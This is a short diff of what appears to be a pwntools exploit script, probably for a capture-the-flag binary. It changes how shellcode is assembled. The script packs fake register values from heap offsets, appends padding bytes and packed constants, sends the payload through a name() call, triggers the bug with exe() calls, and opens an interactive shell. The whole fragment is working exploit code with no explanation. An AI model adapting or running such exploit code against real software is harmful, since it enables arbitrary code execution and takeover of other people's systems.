@@ -58,9 +58,12 @@ def exp():
     rsp=p64(heap-0x3000)
     rdi=p64(heap-0x20fc0)
     shellcode+=rdx+rax+rcx+rsp+rdi
-    name(shellcode.ljust(0x7f,'\xff'))
+    
+    # debugf('nb EC8\nnb 100F')
+    shellcode+='\xff'*(8)+p32(0x33)+p32(0x002a0011)
+    name(shellcode)
     exe(12,0)
-    debugf('nb EC8')
+    
     exe(15,0)
     p.interactive()
 exp()
